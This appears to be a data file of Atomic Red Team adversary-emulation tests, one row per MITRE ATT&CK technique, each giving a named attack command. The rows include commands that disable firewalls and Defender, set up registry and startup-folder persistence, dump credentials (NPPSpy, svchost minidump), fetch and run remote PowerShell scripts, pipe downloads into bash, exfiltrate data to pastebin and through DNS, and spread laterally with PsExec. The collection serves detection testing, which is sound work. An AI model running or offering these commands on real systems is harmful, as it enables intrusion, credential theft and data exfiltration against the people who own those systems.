T1518,Security Software Discovery - ps (macOS),ps aux | egrep 'little\ snitch|cbosxsensorservice|falcond|nessusd|santad|cbdefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|blockblock|lulu'
T1518,Security Software Discovery - ps (Linux),ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'
T1518,Security Software Discovery - pgrep (FreeBSD),pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'
T1518,Security Software Discovery - Sysmon Service,fltmc.exe | findstr.exe 385201
T1518,Security Software Discovery - AV Discovery via WMI,wmic.exe /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list
T1518,Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,powershell get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct powershell get-wmiobject -namespace root\securitycenter2 -class antivirusproduct
T1518,Security Software Discovery - Windows Defender Enumeration,"get-service windefend #check the service state of windows defender get-mpcomputerstatus #provides the current status of security solution elements, including anti-spyware, antivirus, loavprotection, real-time protection, etc get-mpthreat #threats details that have been detected using ms defender"
T1518,Security Software Discovery - Windows Firewall Enumeration,"get-netfirewallprofile | format-table name, enabled get-netfirewallsetting get-netfirewallrule | select displayname, enabled, description"
T1518,Get Windows Defender exclusion settings using WMIC,"wmic /node:localhost /namespace:\\root\microsoft\windows\defender path msft_mppreference get /format:list | findstr /i /c:""disablerealtimemonitoring"" /c:""exclusionpath"" /c:""exclusionextension"" /c:""exclusionprocess"""
T1531,Change User Password - Windows,net user #{user_account} #{new_user_password} /add net.exe user #{user_account} #{new_password}
T1531,Delete User - Windows,net user #{user_account} #{new_user_password} /add net.exe user #{user_account} /delete
T1531,Remove Account From Domain Admin Group,"$pword = convertto-securestring -string #{super_pass} -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist #{super_user}, $pword if((get-aduser #{remove_user} -properties memberof).memberof -like ""cn=domain admins*""){ remove-adgroupmember -identity ""domain admins"" -members #{remove_user} -credential $credential -confirm:$false } else{ write-host ""error - make sure #{remove_user} is in the domain admins group"" -foregroundcolor red }"
T1531,Change User Password via passwd,passwd #{user_account} #enter admin password > enter new password > confirm new password
T1531,Delete User via dscl utility,dscl . -delete /users/#{user_account} #enter admin password
T1531,Delete User via sysadminctl utility,sysadminctl -deleteuser #{user_account} #enter admin password
T1531,Azure AD - Delete user via Azure AD PowerShell,"connect-azuread $userprincipalname = ""#{userprincipalname}"" remove-azureaduser -objectid $userprincipalname"
T1531,Azure AD - Delete user via Azure CLI,"az login $userprincipalname = ""#{userprincipalname}"" az ad user delete --id $userprincipalname"
T1069,Permission Groups Discovery (Local),"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi; if [ -x ""$(command -v dscl)"" ]; then dscl . -list /groups; else echo ""dscl is missing from the machine. skipping...""; fi; if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi; if [ -x ""$(command -v id)"" ]; then id; else echo ""id is missing from the machine. skipping...""; fi; if [ -x ""$(command -v getent)"" ]; then getent group; else echo ""getent is missing from the machine. skipping...""; fi; cat /etc/group"
T1069,Basic Permission Groups Discovery Windows (Local),"net localgroup net localgroup ""administrators"""
T1069,Permission Groups Discovery PowerShell (Local),"get-localgroup get-localgroupmember -name ""administrators"""
T1069,SharpHound3 - LocalAdmin,"new-item -path ""#{output_path}"" -itemtype directory > $null & ""#{sharphound_path}"" -d ""#{domain}"" --collectionmethod localadmin --nosavecache --outputdirectory ""#{output_path}"""
T1069,Wmic Group Discovery,wmic group get name
T1069,WMIObject Group Discovery,get-wmiobject win32_group
T1069,Permission Groups Discovery for Containers- Local Groups,docker build -t t1069 $pathtoatomicsfolder/t1069.001/src/ docker run --name t1069_container --rm -d -t t1069 docker exec t1069_container ./test.sh
T1547,Reg Key Run,"reg add ""hkcu\software\microsoft\windows\currentversion\run"" /v ""atomic red team"" /t reg_sz /f /d ""#{command_to_execute}"""
T1547,Reg Key RunOnce,"reg add hklm\software\microsoft\windows\currentversion\runonceex\0001\depend /v 1 /d ""#{thing_to_execute}"""
T1547,PowerShell Registry RunOnce,"$runoncekey = ""#{reg_key_path}"" set-itemproperty $runoncekey ""nextrun"" '#{thing_to_execute} ""iex (new-object net.webclient).downloadstring(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1547.001/src/discovery.bat`"")""'"
T1547,Suspicious vbs file run from startup Folder,"copy-item ""$pathtoatomicsfolder\t1547.001\src\vbsstartup.vbs"" ""$env:appdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" copy-item ""$pathtoatomicsfolder\t1547.001\src\vbsstartup.vbs"" ""c:\programdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" cscript.exe ""$env:appdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" cscript.exe ""c:\programdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"""
T1547,Suspicious jse file run from startup Folder,"copy-item ""$pathtoatomicsfolder\t1547.001\src\jsestartup.jse"" ""$env:appdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"" copy-item ""$pathtoatomicsfolder\t1547.001\src\jsestartup.jse"" ""c:\programdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"" cscript.exe /e:jscript ""$env:appdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"" cscript.exe /e:jscript ""c:\programdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"""
T1547,Suspicious bat file run from startup Folder,"copy-item ""$pathtoatomicsfolder\t1547.001\src\batstartup.bat"" ""$env:appdata\microsoft\windows\start menu\programs\startup\batstartup.bat"" copy-item ""$pathtoatomicsfolder\t1547.001\src\batstartup.bat"" ""c:\programdata\microsoft\windows\start menu\programs\startup\batstartup.bat"" start-process ""$env:appdata\microsoft\windows\start menu\programs\startup\batstartup.bat"" start-process ""c:\programdata\microsoft\windows\start menu\programs\startup\batstartup.bat"""
T1547,Add Executable Shortcut Link to User Startup Folder,"$target = ""c:\windows\system32\calc.exe"" $shortcutlocation = ""$home\appdata\roaming\microsoft\windows\start menu\programs\startup\calc_exe.lnk"" $wscriptshell = new-object -comobject wscript.shell $create = $wscriptshell.createshortcut($shortcutlocation) $create.targetpath = $target $create.save()"
T1547,Add persistance via Recycle bin,"reg add ""hkcr\clsid\{645ff040-5081-101b-9f08-00aa002f954e}\shell\open\command"" /ve /d ""calc.exe"" /f"
T1547,SystemBC Malware-as-a-Service Registry,"$runkey = ""#{reg_key_path}"" set-itemproperty -path $runkey -name ""socks5_powershell"" -value ""#{reg_key_value}"""
T1547,Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value,"new-item -itemtype directory -path ""#{new_startup_folder}"" copy-item -path ""#{payload}"" -destination ""#{new_startup_folder}"" set-itemproperty -path ""hklm:\software\microsoft\windows\currentversion\explorer\user shell folders"" -name ""common startup"" -value ""#{new_startup_folder}"""
T1547,Change Startup Folder - HKCU Modify User Shell Folders Startup Value,"new-item -itemtype directory -path ""#{new_startup_folder}"" copy-item -path ""#{payload}"" -destination ""#{new_startup_folder}"" set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\explorer\user shell folders"" -name ""startup"" -value ""#{new_startup_folder}"""
T1547,HKCU - Policy Settings Explorer Run Key,"if (!(test-path -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer"")){ new-item -itemtype key -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer"" } if (!(test-path -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer\run"")){ new-item -itemtype key -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer\run"" } set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer\run"" -name ""#{target_key_value_name}"" -value ""#{payload}"""
T1547,HKLM - Policy Settings Explorer Run Key,"if (!(test-path -path ""hklm:\software\microsoft\windows\currentversion\policies\explorer\run"")){ new-item -itemtype key -path ""hklm:\software\microsoft\windows\currentversion\policies\explorer\run"" } set-itemproperty -path ""hklm:\software\microsoft\windows\currentversion\policies\explorer\run"" -name ""#{target_key_value_name}"" -value ""#{payload}"""
T1547,HKLM - Append Command to Winlogon Userinit KEY Value,"$oldvalue = $(get-itempropertyvalue -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit""); set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit-backup"" -value ""$oldvalue""; $newvalue = $oldvalue + "" #{payload}""; set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit"" -value ""$newvalue"""
T1547,HKLM - Modify default System Shell - Winlogon Shell KEY Value ,"$oldvalue = $(get-itempropertyvalue -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""shell""); set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""shell-backup"" -value ""$oldvalue""; $newvalue = $oldvalue + "", #{payload}""; set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""shell"" -value ""$newvalue"""
T1547,secedit used to create a Run key in the HKLM Hive,"secedit /import /db #{secedit_db} /cfg ""#{ini_file}"" secedit /configure /db #{secedit_db}"
T1547,Modify BootExecute Value,"if (!(test-path ""$pathtoatomicsfolder\t1547.001\src\sessionmanagerbackup.reg"")) { reg.exe export ""hklm\system\currentcontrolset\control\session manager"" ""$pathtoatomicsfolder\t1547.001\src\sessionmanagerbackup.reg"" /y } set-itemproperty -path ""hklm:\system\currentcontrolset\control\session manager"" -name ""bootexecute"" -value ""#{registry_value}"" -type multistring"
T1547,Allowing custom application to execute during new RDP logon session,"reg add ""hklm\system\currentcontrolset\control\terminal server\wds\rdpwd"" /f /v startupprograms /t reg_sz /d ""#{malicious_app}"""
T1547,Creating Boot Verification Program Key for application execution during successful boot,"reg add hklm\system\currentcontrolset\control\bootverificationprogram /v imagepath /t reg_sz /d ""#{malicious_file}"""
T1547,Add persistence via Windows Context Menu,"reg add ""hkey_classes_root\directory\background\shell\size modify\command"" /ve /t reg_sz /d ""c:\windows\system32\calc.exe"" /f"
T1137,Install Outlook Home Page Persistence,reg.exe add hkcu\software\microsoft\office\#{outlook_version}\outlook\webview\#{outlook_folder} /v url /t reg_sz /d #{url} /f
T1105,rsync remote file copy (push),rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
T1105,rsync remote file copy (pull),rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
T1105,scp remote file copy (push),scp #{local_file} #{username}@#{remote_host}:#{remote_path}
T1105,scp remote file copy (pull),scp #{username}@#{remote_host}:#{remote_file} #{local_path}
T1105,sftp remote file copy (push),sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
T1105,sftp remote file copy (pull),sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
T1105,certutil download (urlcache),cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
T1105,certutil download (verifyctl),"$datepath = ""certutil-$(get-date -format yyyy_mm_dd)"" new-item -path $datepath -itemtype directory set-location $datepath certutil -verifyctl -split -f #{remote_file} get-childitem | where-object {$_.name -notlike ""*.txt""} | foreach-object { move-item $_.name -destination #{local_path} }"
T1105,Windows - BITSAdmin BITS Download,c:\windows\system32\bitsadmin.exe /transfer #{bits_job_name} /priority high #{remote_file} #{local_path}
T1105,Windows - PowerShell Download,"(new-object system.net.webclient).downloadfile(""#{remote_file}"", ""#{destination_path}"")"
T1105,OSTAP Worming Activity,"pushd #{destination_path} echo var fileobject = wscript.createobject(""scripting.filesystemobject"");var newfile = fileobject.createtextfile(""atomictestfilet1105.js"", true);newfile.writeline(""this is an atomic red team test file for t1105. it simulates how ostap worms accross network shares and drives."");newfile.close(); > atomictestt1105.js cscript.exe atomictestt1105.js //e:jscript del atomictestt1105.js /q >nul 2>&1 del atomictestfilet1105.js /q >nul 2>&1 popd"
T1105,svchost writing a file to a UNC path,copy c:\windows\system32\cmd.exe c:\svchost.exe c:\svchost.exe /c echo t1105 > \\localhost\c$\t1105.txt
T1105,Download a File with Windows Defender MpCmdRun.exe,"cd ""%programdata%\microsoft\windows defender\platform\4.18*"" mpcmdrun.exe -downloadfile -url #{remote_file} -path #{local_path}"
T1105,whois file download,"timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} ""#{query}"" > #{output_file}"
T1105,File Download via PowerShell,(new-object net.webclient).downloadstring('#{target_remote_file}') | out-file #{output_file}; invoke-item #{output_file}
T1105,File download with finger.exe on Windows,finger base64_filedata@#{remote_host}
T1105,Download a file with IMEWDBLD.exe,"$imewdbled = $env:systemroot + ""\system32\ime\shared\imewdbld.exe"" & $imewdbled #{remote_url}"
T1105,Curl Download File,#{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll #{curl_path} -k #{file_download} -o %temp%\allthethingsx64.dll
T1105,Curl Upload File,#{curl_path} -t #{file_path} #{remote_destination} #{curl_path} --upload-file #{file_path} #{remote_destination} #{curl_path} -d #{file_path} #{remote_destination} #{curl_path} --data #{file_path} #{remote_destination}
T1105,Download a file with Microsoft Connection Manager Auto-Download,"""#{path_to_file}"" 1>nul"
T1105,MAZE Propagation Script,"$machine_list = ""pathtoatomicsfolder\..\externalpayloads\t1105machinelist.txt"" $offline_list = ""pathtoatomicsfolder\..\externalpayloads\t1105offlinehosts.txt"" $completed_list = ""pathtoatomicsfolder\..\externalpayloads\t1105completedhosts.txt"" foreach ($machine in get-content -path ""$machine_list"") {if (test-connection -count 1 -computername $machine -quiet) {cmd /c copy ""#{binary_file}"" ""\\$machine\#{remote_drive_letter}$#{exe_remote_folder}"" echo $machine >> ""$completed_list"" wmic /node: ""$machine"" process call create ""regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}""} else {echo $machine >> ""$offline_list""}}"
T1105,Printer Migration Command-Line Tool UNC share folder into a zip file,del %temp%\printbrm.zip >nul 2>&1 #{path_printbrm} -b -d #{path_unc} -f %temp%\printbrm.zip -o force
T1105,Lolbas replace.exe use to copy file,"del %temp%\redcanary.cab >nul 2>&1 #{path_replace} ""#{replace_cab}"" %temp% /a"
T1105,Lolbas replace.exe use to copy UNC file,del %temp%\redcanary.cab >nul 2>&1 #{path_replace} #{replace_cab} %temp% /a
T1105,certreq download,certreq.exe -post -config #{remote_file} c:\windows\win.ini #{local_path}
T1105,Download a file using wscript,"wscript.exe ""#{vbscript_file}"""
T1105,Linux Download File and Run,curl -so #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
T1105,Nimgrab - Transfer Files,"cmd /c ""pathtoatomicsfolder\..\externalpayloads\nimgrab.exe"" #{remote_file} #{destination_path}"
T1105,iwr or Invoke Web-Request download,powershell.exe iwr -uri #{remote_file} -outfile #{local_path}
T1105,Arbitrary file download using the Notepad++ GUP.exe binary,"mkdir ""c:\temp"" cd #{working_dir} gup.exe -unzipto """" ""c:\temp"" ""sample #{target_file_url} #{target_file_sha256}"""
T1105,File download via nscurl,"nscurl -k ""#{remote_file}"" -o ""#{destination_path}"""
T1105,File Download with Sqlcmd.exe,sqlcmd -i #{remote_url} -o #{local_file_path}
T1105,Remote File Copy using PSCP,fsutil file createnew c:\temp\t1105_scp.zip 1048576 echo y | #{pscp_binary} -p #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}
T1105,Windows push file using scp.exe,"# check if the folder exists, create it if it doesn't $folderpath = ""#{local_path}"" if (-not (test-path -path $folderpath)) { new-item -path $folderpath -itemtype directory } # create the file $filepath = join-path -path $folderpath -childpath ""#{file_name}"" new-item -path $filepath -itemtype file -force write-output ""file created: $filepath"" # attack command scp.exe #{local_path}\#{file_name} #{username}@#{remote_host}:#{remote_path}"
T1105,Windows pull file using scp.exe,scp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}
T1105,Windows push file using sftp.exe,"# check if the folder exists, create it if it doesn't $folderpath = ""#{local_path}"" if (-not (test-path -path $folderpath)) { new-item -path $folderpath -itemtype directory } # create the file $filepath = join-path -path $folderpath -childpath ""#{file_name}"" new-item -path $filepath -itemtype file -force write-output ""file created: $filepath"" # attack command echo ""put #{local_path}\#{file_name}"" | sftp #{username}@#{remote_host}:#{remote_path}"
T1105,Windows pull file using sftp.exe,sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}
T1105,Download a file with OneDrive Standalone Updater,"if (-not (test-path ""#{onedrive_path}"")) { write-host ""onedrivestandaloneupdater.exe not found at #{onedrive_path}. test cannot continue."" exit 1 } new-item -path ""hkcu:\software\microsoft\onedrive\updateofficeconfig"" -force | out-null set-itemproperty -path ""hkcu:\software\microsoft\onedrive\updateofficeconfig"" -name ""updateringsettingurlfromoc"" -value ""#{remote_url}"" -type string -force set-itemproperty -path ""hkcu:\software\microsoft\onedrive\updateofficeconfig"" -name ""odsuupdatexmlurlfromoc"" -value ""#{remote_url}"" -type string -force set-itemproperty -path ""hkcu:\software\microsoft\onedrive\updateofficeconfig"" -name ""updatexmlurlfromoc"" -value ""#{remote_url}"" -type string -force set-itemproperty -path ""hkcu:\software\microsoft\onedrive\updateofficeconfig"" -name ""updateofficeconfigtimestamp"" -value 99999999999 -type qword -force # run onedrive standalone updater & ""#{onedrive_path}"""
T1105,Curl Insecure Connection from a Pod,kubectl run #{pod_name} --image=#{image_name} --restart=never --rm -it -- curl -ksl #{remote_url}
T1098,EXO - Full access mailbox permission granted to a user,"import-module exchangeonlinemanagement $secure_pwd = ""#{password}"" | convertto-securestring -asplaintext -force $creds = new-object system.management.automation.pscredential -argumentlist ""#{username}"", $secure_pwd connect-exchangeonline -credential $creds add-mailboxpermission -identity ""#{delegate_target}"" -user ""#{operator_mailbox}"" -accessrights fullaccess -inheritancetype all disconnect-exchangeonline -confirm:$false"
T1562,Disable Microsoft Defender Firewall,netsh advfirewall set currentprofile state off
T1562,Disable Microsoft Defender Firewall via Registry,"reg add ""hkey_local_machine\system\currentcontrolset\services\sharedaccess\parameters\firewallpolicy\publicprofile"" /v ""enablefirewall"" /t reg_dword /d 0 /f"
T1562,Allow SMB and RDP on Microsoft Defender Firewall,"netsh advfirewall firewall set rule group=""remote desktop"" new enable=yes netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=yes"
T1562,Opening ports for proxy - HARDRAIN,"netsh advfirewall firewall add rule name=""atomic testing"" action=allow dir=in protocol=tcp localport=450"
T1562,Open a local port through Windows Firewall to any profile,"netsh advfirewall firewall add rule name=""open port to any"" dir=in protocol=tcp localport=#{local_port} action=allow profile=any"
T1562,Allow Executable Through Firewall Located in Non-Standard Location,"copy-item ""#{exe_file_path}"" -destination ""c:\users\$env:username"" -force netsh advfirewall firewall add rule name=""atomic test"" dir=in action=allow program=""c:\users\$env:username\atomictest.exe"" enable=yes"
T1562,Stop/Start UFW firewall,ufw disable
T1562,Stop/Start Packet Filter,service pf stop service pf disable
T1562,Stop/Start UFW firewall systemctl,systemctl stop ufw
T1562,Turn off UFW logging,ufw logging off
T1562,Add and delete UFW firewall rules,ufw prepend deny from 1.2.3.4 ufw status numbered
T1562,Add and delete Packet Filter rules,"echo ""block in proto tcp from 1.2.3.4 to any"" | pfctl -a pf-rules -f - pfctl -a pf-rules -s rules"
T1562,Edit UFW firewall user.rules file,"echo ""# this is a comment"" >> /etc/ufw/user.rules grep ""# this is a comment"" /etc/ufw/user.rules"
T1562,Edit UFW firewall ufw.conf file,"echo ""# this is a comment"" >> /etc/ufw/ufw.conf grep ""# this is a comment"" /etc/ufw/ufw.conf"
T1562,Edit UFW firewall sysctl.conf file,"echo ""# this is a comment"" >> /etc/ufw/sysctl.conf grep ""# this is a comment"" /etc/ufw/sysctl.conf"
T1562,Edit UFW firewall main configuration file,"echo ""# this is a comment"" >> /etc/default/ufw grep ""# this is a comment"" /etc/default/ufw"
T1562,Tail the UFW firewall log file,tail /var/log/ufw.log
T1562,Disable iptables,iptables-save > /tmp/iptables.rules iptables -f
T1562,Modify/delete iptables firewall rules,iptables -d output -p tcp --dport 21 -j drop
T1562,LockBit Black - Unusual Windows firewall registry modification -cmd,"reg add ""hklm\software\policies\microsoft\windowsfirewall\domainprofile"" /v enablefirewall /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windowsfirewall\standardprofile"" /v enablefirewall /t reg_dword /d 0 /f"
T1562,LockBit Black - Unusual Windows firewall registry modification -Powershell,"new-itemproperty ""hklm:\software\policies\microsoft\windowsfirewall\domainprofile"" -name enablefirewall -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windowsfirewall\standardprofile"" -name enablefirewall -propertytype dword -value 0 -force"
T1562,Blackbit - Disable Windows Firewall using netsh firewall,netsh firewall set opmode mode=disable
T1562,ESXi - Disable Firewall via Esxcli,#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m pathtoatomicsfolder\..\atomics\t1562.004\src\esxi_disable_firewall.txt
T1562,Set a firewall rule using New-NetFirewallRule,"new-netfirewallrule -displayname ""new rule"" -direction ""#{direction}"" -localport ""#{local_port}"" -protocol ""#{protocol}"" -action ""#{action}"""
T1562,ESXi - Set Firewall to PASS Traffic,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""esxcli network firewall set --default-action true"""
T1010,List Process Main Windows - C# .NET,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name}"
T1569,Execute a Command as a Service,"sc.exe create #{service_name} binpath= ""#{executable_command}"" sc.exe start #{service_name} sc.exe delete #{service_name}"
T1569,Use PsExec to execute a command on a remote host,"""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" \\#{remote_host} -i -u #{user_name} -p #{password} -accepteula ""c:\windows\system32\calc.exe"""
T1569,psexec.py (Impacket),psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'
T1569,BlackCat pre-encryption cmds with Lateral Movement,"cmd.exe /c ""wmic csproduct get uuid"" cmd.exe /c ""fsutil behavior set symlinkevaluation r2l:1"" cmd.exe /c ""fsutil behavior set symlinkevaluation r2r:1"" reg add hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters /v maxmpxct /d 65535 /t reg_dword /f copy ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" $env:temp cmd.exe /c ""$env:temp\psexec.exe -accepteula \\#{targethost} cmd.exe /c echo ""--access-token"""""
T1569,Use RemCom to execute a command on a remote host,"""pathtoatomicsfolder\..\externalpayloads\remcom.exe"" \\#{remote_host} /user:#{user_name} /pwd:#{password} cmd.exe"
T1569,Snake Malware Service Create,"sc.exe create ""werfaultsvc"" binpath= ""$env:windir\winsxs\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\werfault.exe"" displayname= ""werfault service"" start= auto"
T1569,Modifying ACL of Service Control Manager via SDET,sc.exe sdset scmanager d:(a;;ka;;;wd)
T1569,Pipe Creation - PsExec Tool Execution From Suspicious Locations,cd c:\users\public\temp\ .\psexec.exe -i -s cmd -accepteula
T1505,Install IIS Module using AppCmd.exe,%windir%\system32\inetsrv\appcmd.exe install module /name:#{module_name} /image:#{dll_path}
T1505,Install IIS Module using PowerShell Cmdlet New-WebGlobalModule,new-webglobalmodule -name #{module_name} -image #{dll_path}
T1497,Delay execution with ping,ping -c #{ping_count} 8.8.8.8 > /dev/null #{evil_command}
T1039,Copy a sensitive File over Administrative share with copy,copy \\#{remote}\c$\#{share_file} %temp%\#{local_file}
T1039,Copy a sensitive File over Administrative share with Powershell,"copy-item -path ""\\#{remote}\c$\#{share_file}"" -destination ""$env:temp\#{local_file}"""
T1612,Build Image On Host,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh
T1027,Dynamic API Resolution-Ninja-syscall,"start-process ""#{exe_binary}"" start-sleep -seconds 7 if (test-path ""c:\users\default\appdata\local\temp\hello.log"") { remove-item ""c:\users\default\appdata\local\temp\hello.log"" -force; write-host ""[+] hello.log removed."" }"
T1567,Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows),"$apikey = ""#{api_key}"" $content = ""secrets, api keys, passwords..."" $url = ""https://pastebin.com/api/api_post.php"" $postdata = @{ api_dev_key = $apikey api_option = ""paste"" api_paste_code = $content } $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"""
T1003,Gsecdump,"""#{gsecdump_exe}"" -a"
T1003,Credential Dumping with NPPSpy,"copy-item ""pathtoatomicsfolder\..\externalpayloads\nppspy.dll"" -destination ""c:\windows\system32"" $path = get-itemproperty -path ""hklm:\system\currentcontrolset\control\networkprovider\order"" -name providerorder $updatedvalue = $path.providerorder + "",nppspy"" set-itemproperty -path $path.pspath -name ""providerorder"" -value $updatedvalue $rv = new-item -path hklm:\system\currentcontrolset\services\nppspy -erroraction ignore $rv = new-item -path hklm:\system\currentcontrolset\services\nppspy\networkprovider -erroraction ignore $rv = new-itemproperty -path hklm:\system\currentcontrolset\services\nppspy\networkprovider -name ""class"" -value 2 -erroraction ignore $rv = new-itemproperty -path hklm:\system\currentcontrolset\services\nppspy\networkprovider -name ""name"" -value nppspy -erroraction ignore $rv = new-itemproperty -path hklm:\system\currentcontrolset\services\nppspy\networkprovider -name ""providerpath"" -propertytype expandstring -value ""%systemroot%\system32\nppspy.dll"" -erroraction ignore echo ""[!] please, logout and log back in. cleartext password for this account is going to be located in c:\nppspy.txt"""
T1003,Dump svchost.exe to gather RDP credentials,"$ps = (get-nettcpconnection -localport 3389 -state established -erroraction ignore) if($ps){$id = $ps[0].owningprocess} else {$id = (get-process svchost)[0].id } c:\windows\system32\rundll32.exe c:\windows\system32\comsvcs.dll, minidump $id $env:temp\svchost-exe.dmp full"
T1003,Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list),c:\windows\system32\inetsrv\appcmd.exe list apppool /@t:* c:\windows\system32\inetsrv\appcmd.exe list apppool /@text:* c:\windows\system32\inetsrv\appcmd.exe list apppool /text:*
T1003,Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config),c:\windows\system32\inetsrv\appcmd.exe list apppool /config
T1003,Dump Credential Manager using keymgr.dll and rundll32.exe,"rundll32.exe keymgr,krshowkeymgr"
T1003,Send NTLM Hash with RPC Test Connection,rpcping -s #{server_ip} -e #{custom_port} -a privacy -u ntlm 1>$null
T1041,C2 Data Exfiltration,"if(-not (test-path #{filepath})){ 1..100 | foreach-object { add-content -path #{filepath} -value ""this is line $_."" } } [system.net.servicepointmanager]::expect100continue = $false $filecontent = get-content -path #{filepath} invoke-webrequest -uri #{destination_url} -method post -body $filecontent -disablekeepalive"
T1041,Text Based Data Exfiltration using DNS subdomains,"$dnsserver = ""#{dns_server}"" $exfiltrateddata = ""#{exfiltrated_data}"" $chunksize = #{chunk_size} $encodeddata = [system.text.encoding]::utf8.getbytes($exfiltrateddata) $encodeddata = [convert]::tobase64string($encodeddata) $chunks = $encodeddata -split ""(.{$chunksize})"" foreach ($chunk in $chunks) { $dnsquery = $chunk + ""."" + $dnsserver resolve-dnsname -name $dnsquery start-sleep -seconds 5 }"
T1053,At.exe Scheduled task,at 13:20 /interactive cmd
T1053,At - Schedule a job,"echo ""#{at_command}"" | at #{time_spec}"
T1053,At - Schedule a job via kubectl in a Pod,"kubectl run #{pod_name} --image=#{image_name} --restart=never --attach --rm -i -- bash -lc ""apt-get update -y >/dev/null 2>&1 && apt-get install -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo '#{at_command}' | at #{time_spec} && at -l"""
T1557,LLMNR Poisoning with Inveigh (PowerShell),"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y"
T1106,Execution through API - CreateProcess,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /out:""#{output_file}"" /target:exe ""#{source_file}"" %tmp%/t1106.exe"
T1106,WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/createprocess/get-createprocesssystem.ps1')
T1106,WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/createprocess/get-createprocesssystembind.ps1')
T1106,WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/namedpipe/namedpipesystem.ps1')
T1106,Run Shellcode via Syscall in Go,$pathtoatomicsfolder\t1106\bin\x64\syscall.exe -debug
T1006,Read volume boot sector via DOS device path (PowerShell),"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1136,AWS - Create a new IAM user,aws iam create-user --user-name #{username}
